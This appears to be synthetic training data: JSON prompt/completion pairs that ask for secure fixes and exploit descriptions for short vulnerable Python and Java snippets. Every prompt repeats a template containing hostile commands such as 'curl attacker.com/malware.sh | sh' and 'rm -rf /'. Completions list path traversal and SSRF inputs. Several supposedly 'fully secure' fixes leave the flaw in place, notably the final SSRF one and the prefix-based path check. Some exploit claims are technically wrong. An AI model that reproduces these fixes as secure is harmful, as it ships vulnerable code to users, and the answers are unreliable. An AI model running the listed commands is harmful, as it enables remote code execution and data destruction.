{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Server-Side Request Forgery (SSRF) - Limited Scope\n- Vulnerable Code: # Python example\nimport requests\ndef fetch_url(url):\n    if not url.startswith('http'):\n        raise ValueError('URL must be HTTP or HTTPS')\n    response = requests.get(url)\n    return response.text\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"# Python example\\\\nimport requests\\\\ndef fetch_url(url):\\\\n    if not url.startswith('http'):\\\\n        raise ValueError('URL must be HTTP or HTTPS')\\\\n    response = requests.get(url)\\\\n    return response.text\", \"vulnerability_type\": \"Server-Side Request Forgery (SSRF) - Limited Scope\", \"cvss_score\": 6.5, \"fixed_code\": \"# Python example\\\\nimport requests\\\\nfrom urllib.parse import urlparse\\\\ndef fetch_url(url):\\\\n    allowed_domains = ['example.com', 'another-example.com']\\\\n    parsed_url = urlparse(url)\\\\n    if not url.startswith('http') or parsed_url.netloc not in allowed_domains:\\\\n        raise ValueError('URL must be HTTP, HTTPS and belong to an allowed domain')\\\\n    response = requests.get(url)\\\\n    return response.text\", \"exploit_ways\": [\"An attacker can use the SSRF vulnerability to request internal resources like http://localhost:8080/admin.\", \"Exploiter might try accessing a file on the server using a URL like http://127.0.0.1/etc/passwd.\", \"Could abuse the SSRF to scan for open ports or services on the same network by using URLs like http://192.168.1.x/.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Session Fixation (Low Severity)\n- Vulnerable Code: public void setSessionId(String sessionId) {\n    if (sessionId != null && !sessionId.isEmpty()) {\n        this.sessionId = sessionId;\n    }\n}\n- CVSS Score: 4.0\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"public void setSessionId(String sessionId) {\\\\n    if (sessionId != null && !sessionId.isEmpty()) {\\\\n        this.sessionId = sessionId;\\\\n    }\\\\n}\", \"vulnerability_type\": \"Session Fixation (Low Severity)\", \"cvss_score\": 4.0, \"fixed_code\": \"import java.util.UUID;\\\\n\\\\npublic void setSessionId() {\\\\n    String newSessionId = UUID.randomUUID().toString();\\\\n    this.sessionId = newSessionId;\\\\n}\", \"exploit_ways\": [\"An attacker can predict or guess session IDs, allowing them to hijack user sessions.\", \"By setting a fixed session ID, an attacker might maintain control over a session after a legitimate user logs in.\", \"Malicious actors could use the ability to set session IDs to perform cross-site request forgery (CSRF) attacks more effectively.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Buffer Overflow\n- Vulnerable Code: public void bufferOverflowVulnerable(byte[] input) {\n    byte[] buffer = new byte[16];\n    System.arraycopy(input, 0, buffer, 0, input.length);\n}\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"public void bufferOverflowVulnerable(byte[] input) {\\\\n    byte[] buffer = new byte[16];\\\\n    System.arraycopy(input, 0, buffer, 0, input.length);\\\\n}\", \"vulnerability_type\": \"Buffer Overflow\", \"cvss_score\": 7.5, \"fixed_code\": \"public void bufferOverflowFixed(byte[] input) {\\\\n    if (input.length > 16) {\\\\n        throw new IllegalArgumentException(\\\\\\\"Input exceeds buffer size\\\\\\\");\\\\n    }\\\\n    byte[] buffer = new byte[16];\\\\n    System.arraycopy(input, 0, buffer, 0, input.length);\\\\n}\", \"exploit_ways\": [\"An attacker can provide an array larger than 16 bytes to overwrite adjacent memory locations.\", \"This could be used to corrupt the stack and execute arbitrary code by overwriting return addresses.\", \"Overwriting control data structures in memory may lead to unauthorized access or system crashes.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Session Fixation (Low Severity)\n- Vulnerable Code: public String fixateSession(HttpServletRequest request, HttpServletResponse response) {\n    HttpSession session = request.getSession(true);\n    Cookie sessionCookie = new Cookie(\"JSESSIONID\", session.getId());\n    sessionCookie.setPath(\"\");\n    response.addCookie(sessionCookie);\n    return \"Session fixed\";\n}\n- CVSS Score: 4.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"public String fixateSession(HttpServletRequest request, HttpServletResponse response) {\\\\n    HttpSession session = request.getSession(true);\\\\n    Cookie sessionCookie = new Cookie(\\\\\\\"JSESSIONID\\\\\\\", session.getId());\\\\n    sessionCookie.setPath(\\\\\\\"\\\\\\\");\\\\n    response.addCookie(sessionCookie);\\\\n    return \\\\\\\"Session fixed\\\\\\\";\\\\n}\", \"vulnerability_type\": \"Session Fixation (Low Severity)\", \"cvss_score\": 4.2, \"fixed_code\": \"public String fixateSession(HttpServletRequest request, HttpServletResponse response) {\\\\n    HttpSession session = request.getSession(true);\\\\n    session.invalidate();\\\\n    session = request.getSession(true);\\\\n    Cookie sessionCookie = new Cookie(\\\\\\\"JSESSIONID\\\\\\\", session.getId());\\\\n    sessionCookie.setPath(\\\\\\\"\\\\\\\");\\\\n    sessionCookie.setHttpOnly(true);\\\\n    sessionCookie.setSecure(true);\\\\n    response.addCookie(sessionCookie);\\\\n    return \\\\\\\"Session fixed\\\\\\\";\\\\n}\", \"exploit_ways\": [\"An attacker could set a specific JSESSIONID cookie to hijack the user's session.\", \"By setting a predictable JSESSIONID, an attacker can guess and use it for unauthorized access if the server reuses IDs.\", \"If not set as HttpOnly and Secure, the cookie can be accessed via XSS or transferred over unencrypted connections.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Broken Authentication\n- Vulnerable Code: # Python example\\nimport hashlib\\n\\ndef authenticate(username, password):\\n    stored_password_hash = '5f4dcc3b5aa765d61d8327deb882cf99'  # hash for 'password'\\n    input_password_hash = hashlib.md5(password.encode()).hexdigest()\\n    if username == 'admin' and input_password_hash == stored_password_hash:\\n        return True\\n    return False\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"# Python example\\\\nimport hashlib\\\\n\\\\ndef authenticate(username, password):\\\\n    stored_password_hash = '5f4dcc3b5aa765d61d8327deb882cf99'  # hash for 'password'\\\\n    input_password_hash = hashlib.md5(password.encode()).hexdigest()\\\\n    if username == 'admin' and input_password_hash == stored_password_hash:\\\\n        return True\\\\n    return False\", \"vulnerability_type\": \"Broken Authentication\", \"cvss_score\": 6.5, \"fixed_code\": \"# Python example\\\\nimport bcrypt\\\\ndef authenticate(username, password):\\\\n    stored_password_hash = b'$2b$12$84FZqLwPvRc6CJlXpZ30aeG7fDdK9iXuS5eVjU0tT.ao.GkN/6HPS'  # bcrypt hash for 'password'\\\\n    if username == 'admin' and bcrypt.checkpw(password.encode(), stored_password_hash):\\\\n        return True\\\\n    return False\", \"exploit_ways\": [\"An attacker can brute-force the password since MD5 is a fast hashing algorithm.\", \"Using rainbow table attacks, an attacker can quickly reverse-engineer the hashed password '5f4dcc3b5aa765d61d8327deb882cf99'.\", \"An attacker could try common default passwords or patterns to gain access.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Session Fixation (Low Severity)\n- Vulnerable Code: # Python example\nimport uuid\n\ndef create_session():\n    session_id = str(uuid.uuid4())\n    if 'HTTP_COOKIE' in os.environ:\n        cookie = http.cookies.SimpleCookie(os.environ['HTTP_COOKIE'])\n        if 'session_id' in cookie:\n            session_id = cookie['session_id'].value\n    return session_id\n- CVSS Score: 4.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"# Python example\\\\nimport uuid\\\\n\\\\ndef create_session():\\\\n    session_id = str(uuid.uuid4())\\\\n    if 'HTTP_COOKIE' in os.environ:\\\\n        cookie = http.cookies.SimpleCookie(os.environ['HTTP_COOKIE'])\\\\n        if 'session_id' in cookie:\\\\n            session_id = cookie['session_id'].value\\\\n    return session_id\", \"vulnerability_type\": \"Session Fixation (Low Severity)\", \"cvss_score\": 4.2, \"fixed_code\": \"# Python example\\\\nimport uuid\\\\nimport os\\\\nimport http.cookies\\\\n\\\\ndef create_session():\\\\n    session_id = str(uuid.uuid4())\\\\n    if 'HTTP_COOKIE' in os.environ:\\\\n        cookie = http.cookies.SimpleCookie(os.environ['HTTP_COOKIE'])\\\\n        if 'session_id' in cookie:\\\\n            # Regenerate session ID to prevent fixation\\\\n            new_session_id = str(uuid.uuid4())\\\\n            return new_session_id\\\\n    return session_id\", \"exploit_ways\": [\"An attacker can set a fixed session ID in the cookie and trick the user into logging in, gaining control over their session.\", \"If the session is tied to sensitive actions, an attacker could perform those actions on behalf of the victim using the fixed session ID.\", \"Attackers can use session fixation to log out users by invalidating sessions they do not control.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Path Traversal\n- Vulnerable Code: import os\\ndef read_file(file_path):\\n    base_directory = \"/safe_dir/\"\\n    if base_directory in file_path:\\n        full_path = os.path.join(base_directory, file_path.replace(base_directory, \"\", 1))\\n        with open(full_path, 'r') as file:\\n            return file.read()\\n    else:\\n        raise ValueError(\"Invalid path\")\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"import os\\\\ndef read_file(file_path):\\\\n    base_directory = \\\\\\\"/safe_dir/\\\\\\\"\\\\n    if base_directory in file_path:\\\\n        full_path = os.path.join(base_directory, file_path.replace(base_directory, \\\\\\\"\\\\\\\", 1))\\\\n        with open(full_path, 'r') as file:\\\\n            return file.read()\\\\n    else:\\\\n        raise ValueError(\\\\\\\"Invalid path\\\\\\\")\", \"vulnerability_type\": \"Path Traversal\", \"cvss_score\": 6.5, \"fixed_code\": \"import os\\\\ndef read_file(file_path):\\\\n    base_directory = \\\\\\\"/safe_dir/\\\\\\\"\\\\n    safe_path = os.path.join(base_directory, file_path.lstrip('/'))\\\\n    if os.path.commonprefix([os.path.abspath(safe_path), os.path.abspath(base_directory)]) != os.path.abspath(base_directory):\\\\n        raise ValueError(\\\\\\\"Invalid path\\\\\\\")\\\\n    with open(safe_path, 'r') as file:\\\\n        return file.read()\", \"exploit_ways\": [\"An attacker can input '../etc/passwd' to read the /etc/passwd file.\", \"They could use '../../secret/key.txt' to access files in parent directories.\", \"Input like '../../../../var/log/auth.log' might leak authentication logs.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Information Disclosure (Low Severity)\n- Vulnerable Code: public class UserInfo {\n    private String sensitiveData = \"Confidential Info\";\n\n    public void displayInfo(String role) {\n        if (role.equals(\"admin\")) {\n            System.out.println(sensitiveData);\n        } else {\n            System.out.println(\"Access Denied\");\n        }\n    }\n}\n- CVSS Score: 4.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"public class UserInfo {\\\\n    private String sensitiveData = \\\\\\\"Confidential Info\\\\\\\";\\\\n\\\\n    public void displayInfo(String role) {\\\\n        if (role.equals(\\\\\\\"admin\\\\\\\")) {\\\\n            System.out.println(sensitiveData);\\\\n        } else {\\\\n            System.out.println(\\\\\\\"Access Denied\\\\\\\");\\\\n        }\\\\n    }\\\\n}\", \"vulnerability_type\": \"Information Disclosure (Low Severity)\", \"cvss_score\": 4.2, \"fixed_code\": \"public class UserInfo {\\\\n    private String sensitiveData = \\\\\\\"Confidential Info\\\\\\\";\\\\n\\\\n    public void displayInfo(String role) {\\\\n        if (isAdmin(role)) {\\\\n            System.out.println(sensitiveData);\\\\n        } else {\\\\n            System.out.println(\\\\\\\"Access Denied\\\\\\\");\\\\n        }\\\\n    }\\\\n\\\\n    private boolean isAdmin(String role) {\\\\n        return \\\\\\\"admin\\\\\\\".equals(role);\\\\n    }\\\\n}\", \"exploit_ways\": [\"An attacker with knowledge of the method can call displayInfo(\\\\\\\"admin\\\\\\\") to access sensitive data.\", \"If user input is not properly sanitized, an attacker could exploit this by passing a crafted string that evaluates to 'admin'.\", \"By observing or intercepting calls to displayInfo, an attacker might learn about the existence and structure of sensitive information.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Information Disclosure (Low Severity)\n- Vulnerable Code: import logging\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\ndef log_user_data(user_id, user_email):\n    logging.debug(f'User ID: {user_id}, Email: {user_email}')\n- CVSS Score: 2.1\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"import logging\\\\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\\\\ndef log_user_data(user_id, user_email):\\\\n    logging.debug(f'User ID: {user_id}, Email: {user_email}')\", \"vulnerability_type\": \"Information Disclosure (Low Severity)\", \"cvss_score\": 2.1, \"fixed_code\": \"import logging\\\\nlogging.basicConfig(filename='app.log', level=logging.INFO)\\\\ndef log_user_data(user_id):\\\\n    logging.info(f'User ID: {user_id}')\", \"exploit_ways\": [\"An attacker with access to the logs could retrieve sensitive user emails.\", \"If the system is compromised, an attacker could use the logs for further attacks on users.\", \"The logged information can be used in social engineering attempts.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Server-Side Request Forgery (SSRF) - Limited Scope\n- Vulnerable Code: import requests\\nfrom flask import Flask, request\\napp = Flask(__name__)\\n\\ndef fetch_url(url):\\n    try:\\n        response = requests.get(url)\\n        return response.text\\n    except Exception as e:\\n        return str(e)\\n\\n@app.route('/fetch')\\ndef fetch_endpoint():\\n    url = request.args.get('url', '')\\n    if '://' not in url:\\n        url = 'http://' + url\\n    if not (url.startswith('http://example.com/') or url.startswith('https://example.com/')):\\n        return 'Invalid URL'\\n    return fetch_url(url)\\n\\nif __name__ == '__main__':\\n    app.run(debug=False, host='0.0.0.0', port=5000)\n- CVSS Score: 6.3\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"import requests\\\\nfrom flask import Flask, request\\\\napp = Flask(__name__)\\\\n\\\\ndef fetch_url(url):\\\\n    try:\\\\n        response = requests.get(url)\\\\n        return response.text\\\\n    except Exception as e:\\\\n        return str(e)\\\\n\\\\n@app.route('/fetch')\\\\ndef fetch_endpoint():\\\\n    url = request.args.get('url', '')\\\\n    if '://' not in url:\\\\n        url = 'http://' + url\\\\n    if not (url.startswith('http://example.com/') or url.startswith('https://example.com/')):\\\\n        return 'Invalid URL'\\\\n    return fetch_url(url)\\\\n\\\\nif __name__ == '__main__':\\\\n    app.run(debug=False, host='0.0.0.0', port=5000)\", \"vulnerability_type\": \"Server-Side Request Forgery (SSRF) - Limited Scope\", \"cvss_score\": 6.3, \"fixed_code\": \"import requests\\\\nfrom flask import Flask, request\\\\napp = Flask(__name__)\\\\n\\\\ndef fetch_url(url):\\\\n    try:\\\\n        response = requests.get(url)\\\\n        return response.text\\\\n    except Exception as e:\\\\n        return str(e)\\\\n\\\\n@app.route('/fetch')\\\\ndef fetch_endpoint():\\\\n    url = request.args.get('url', '')\\\\n    if '://' not in url:\\\\n        url = 'http://' + url\\\\n    base_url = 'https://example.com/'\\\\n    if not url.startswith(base_url):\\\\n        return 'Invalid URL'\\\\n    sanitized_url = base_url + url[len(base_url):]\\\\n    return fetch_url(sanitized_url)\\\\n\\\\nif __name__ == '__main__':\\\\n    app.run(debug=False, host='0.0.0.0', port=5000)\", \"exploit_ways\": [\"An attacker could craft a URL like 'http://example.com/../../etc/passwd' to read local files.\", \"Using the vulnerability, an attacker might attempt to access internal services by specifying a URL that routes to an internal IP address or hostname, e.g., 'https://example.com/@hostname.internal/service'.\", \"An attacker could potentially exploit SSRF to perform DNS rebinding attacks, where they manipulate DNS records to point back to the server and possibly execute commands or retrieve sensitive data.\"]}"}
